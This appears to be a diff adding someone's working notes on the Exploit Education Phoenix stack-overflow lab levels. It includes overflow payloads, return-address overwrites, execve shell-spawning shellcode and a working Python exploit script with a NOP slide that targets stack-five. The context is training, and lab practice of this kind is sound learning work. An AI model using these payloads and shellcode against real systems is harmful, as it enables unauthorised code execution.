@@ -1,0 +1,210 @@
+Creds:
+user:user
+
+File location:
+/opt/phoenix/i486
+/opt/phoenix/amd......
+
+#################
+Stack one
+################
+./stack-one 9999999999999999999999999999999999999999999999999999999999999999bYlI
+
+#############
+Stack two
+############
+export ExploitEducation=$'\x1b\xba\x94(\xae\xd0\xb2\xa6\xf2f\xf6\x1fI\xed\xbao$\xc6D\x08\xba\x81\x96v\x1b\xba\x94(\xae\xd0\xb2\xa6\xf2f\xf6\x1fI\xed\xbao$\xc6D\x08\xba\x81\x96v\x1b\xba\x94(\xae\xd0\xb2\xa6\xf2f\xf6\x1fI\xed\xbao\x0a\x09\x0a\x0d';./stack-two
+
+Just a bunch of random hex and then the correct hex, but written backwards because little endian.
+
+###########
+Stack three
+############
+64 bytes of 9's is 9999999999999999999999999999999999999999999999999999999999999999
+complete_level location is 0x08048535
+
+input=9999999999999999999999999999999999999999999999999999999999999999
+input+=$'\x35\x85\x04\x08'
+echo $input | ./stack-three
+
+##############
+Stack four
+##############
+Previous base pointer was 0xffffd608
+My input starts at 0xffffd5ac
+The base pointer is at 0xffffd5f8
+The difference is 4C which is 76 bytes. We had to add 4 to that to start changing the pushed ebp.
+
+Actually in hindsight i suspect we had to add 4 because we want to override eip, not ebp.
+
+80 9's:
+99999999999999999999999999999999999999999999999999999999999999999999999999999999
+
+The complete_level part is at 0x080484e5
+
+echo $'99999999999999999999999999999999999999999999999999999999999999999999999999999999\xe5\x84\x04\x08' | ./stack-four
+
+#############
+Stack five
+############
+We have to overwrite the ebp - The value is 0xffffd608. The location in memory is 0xffffd5f8
+The ebp should point to the start of buffer - 0xffffd570
+The difference between those memory locations is 136 bytes.
+
+136 9's:
+9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+
+BUUT if we put so many bytes, then also gets will add NULL bytes to the stack. So if we want to stop writing at just before the ebp, then 134 bytes will be enough.
+
+134 9's:
+99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+
+The buffer should contain shell code `execve("/bin/sh", ...)`. You can get examples from the internet.
+Test shell code: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+Test shell code length: 23 bytes.
+
+Shellcode + 111 bytes padding:
+$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999'
+
+Created file ~/input.rr2 (make sure the tty is correct using the `tty` command, change the input file):
+#!/usr/bin/rarun2
+stdio=/dev/pts/1
+stdin=/home/user/input.txt
+
+echo $'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999' > /home/user/input.txt
+
+r2 -d stack-five -e dbg.profile=/home/user/input.rr2
+
+ebp value changed to 0xffffd5c8. Address changed to 0xffffd5b8
+start of buffer is 0xffffd530.
+The difference remained the same.
+
+Override ebp. Had to add two more nines because the nulls are always at the end of the string:
+echo $'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x8099999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999\x30\xd5\xff\xff' > /home/user/input.txt
+
+This isn't working, I'm getting segmentation faults.
+
+Tried following a walkthrough, created py file in stack5 folder. Still segfaulting
+
+Ok i think the problem is that I was trying to override the base pointer. What I should have been doing is trying to override the saved EIP, which is on the stack.
+
+EIP location on the stack: 0xffffd5bc
+
+I need to add 4 more bytes of filler to override it. That seems to have done it, EIP now goes to the stack successfully. But still getting segfault at this command: 
+0xffffd54c b    008c97ff48f7.  add byte [edi + edx*4 - 0x2408b701], cl
+
+Probably because that memory address doesn't exist...
+
+I tested out the test program with executable stack options of course. The test program produced a shell:
+http://shell-storm.org/shellcode/files/shellcode-806.php
+
+Yeah it's still segfaulting at:
+0xffffd54c b    008c97ff48f7.  add byte [edi + edx*4 - 0x2408b701], cl
+
+Aight I think I figured out the problem. It's failing at rbx because I'm working with a 32 bit binary. Fuck dude.
+
+Switch to this one: 
+http://shell-storm.org/shellcode/files/shellcode-863.php
+
+So it still segfaults, but it looks like it's not too bad:
+1) the first byte gets fucked somehow
+2) it's supposed to be little endian but it's not -- Actually it's fine. Hexdump swaps the endianness. It's correct on the stack.
+
+First byte:
+It's already wrong when it comes through in gets.
+
+Also the test file doesn't even give me a shell.
+
+Trying to switch to amd64 and following the tutorial: https://www.lucas-bader.com/ctf/2019/02/02/stack5
+
+Following the tutorial seems to work.
+cat'ing the payload gives me a "illegal instruction"
+Nope still can't get it to work when debugging with radare2, the stack layout is different that it is in a normal execution environment.
+
+Trying to do literally what he's doing.
+Buffer address: 0x7fffffffe420
+Return address: 0x7fffffffe4a8
+Didn't seem to work. segfault
+
+
+
+BUUT I just noticed that:
+1) we got an illegal argument in the beginning, which is decent.
+2) it might still be asking us for input? I think? Like, it still expects input. But maybe it's fine. Idk.
+
+###########################
+Stack 5 - day 2
+###########################
+Which way does the stack grow/shrink? Make sure I wrote it down correctly in the hacking guide
+
+We should put a breakpoint 0xcc instruction in front and see if we hit it.
+If we do, then it might be an input issue https://www.reddit.com/r/LiveOverflow/comments/ejq4u5/exploiteducationpheonix_stackfive/
+If we don't, then it might be an environment issue.
+
+Roadmap:
+*) Run the shellstorm example code and make sure it returns a shell
+*) Check out the differences in address space between normal gdb and the "catch exe" method.
+*) Replace the first byte with 0xcc, make sure we get it working with radare --> actually, we can replace all bytes with 0xcc. Write that down in hacking guide
+*) See if we get a sigtrap when running the code normally
+*) If not, change the amount of NOPs in front of the code to see if we get a sigtrap
+*) If not, use the default GDB and see if we can replicate 
+*) Write the updated sploit script into hacking guide 
+### Run the shellstorm example code and make sure it returns a shell
+
+
+The test code worked
+
+### Check out the differences in address space between normal gdb and the "catch exe" method.
+
+Start of the buffer:
+"catch exe" method:
+0x7fffffffed50:	0x41414141
+
+Normal gdb:
+0x7fffffffe490:	0x41414141
+
+Radare2:
+0x7fffffffe4b0  0x0000004141414141
+
+I also made a test file with which I can compare the catch exe method to normal execution:
+Normal: ./catch-exec-test 0x7fffffffe4b0
+Normal: /home/user/stack/stack5/catch-exec-test 0x7fffffffe470
+Radare2: ./catch-exec-test 0x7fffffffe490
+Radare2: /home/user/stack/stack5/catch-exec-test 0x7fffffffe460
+Gdb with environment variables: ./catch-exec-test 0x7fffffffe460
+Gdb without environment variables: ./catch-exec-test 0x7fffffffe480
+Gdb with "catch exe": ./catch-exec-test 0x7fffffffed60
+
+
+### Replace the first byte with 0xcc, make sure we get it working with radare 
+0x7fffffffe518 is the address of the RIP
+0x7fffffffe490 is the address of the start of the buffer.
+The difference is 136 bytes.
+0x7fffffffe560 is the start of the shell code
+
+
+So I got it working with both radare2 and gdb, but it's not working normally. I can't get it to get to the sigtrap.
+
+I made the nopslide 2x longer and moved the return EIP back even further than it was initially, and got it working!
+
+### Working exploit
+
+create_sploit.py:
+```
+from __future__ import print_function
+
+override_length = 136
+
+padding = 'A' * override_length
+return_address = "\x00\x00\x7f\xff\xff\xff\xe5\x40"[::-1]
+nop_slide = "\x90" * 128
+shell_code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+payload = padding + return_address + nop_slide + shell_code
+
+with open('/home/user/input.txt', 'w') as f:
+            print(payload, file=f)
+```
+
+python create_sploit.py > input.txt
+(cat ~/input.txt; cat) | /opt/phoenix/amd64/stack-five
